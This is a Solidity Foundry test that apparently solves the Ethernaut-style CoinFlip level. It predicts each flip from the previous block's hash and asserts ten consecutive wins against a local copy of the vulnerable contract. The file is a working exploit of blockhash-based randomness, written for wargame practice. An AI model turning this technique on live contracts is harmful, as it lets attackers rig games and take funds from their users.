// SPDX-License-Identifier: MIT

import "forge-std/Test.sol";
import {CoinFlip} from "../../src/levels/CoinFlip.sol";

pragma solidity 0.8.17;

contract CoinFlipTest is Test {
    address attacker = address(0x123);
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip private coinFlip;

    function setUp() public {
        coinFlip = new CoinFlip();
    }

    function testCoinFlipHack() external {
        vm.startPrank(attacker);

        for (uint256 i = 0; i < 10; i++) {
            bool guess = computeGuess();
            bool success = coinFlip.flip(guess);
            if (!success) fail("Failed to guess the side");
            vm.roll(block.number + 1);
        }

        assertEq(coinFlip.consecutiveWins(), 10, "Did not win consecutively");
        vm.stopPrank();
    }

    function computeGuess() private returns (bool) {
        uint256 latestBlockNumber = block.number - 1;
        uint256 blockValue = uint256(blockhash(latestBlockNumber));
        uint256 flip = blockValue / FACTOR;
        emit log_named_uint("Block ", latestBlockNumber);
        return flip == 1;
    }
}
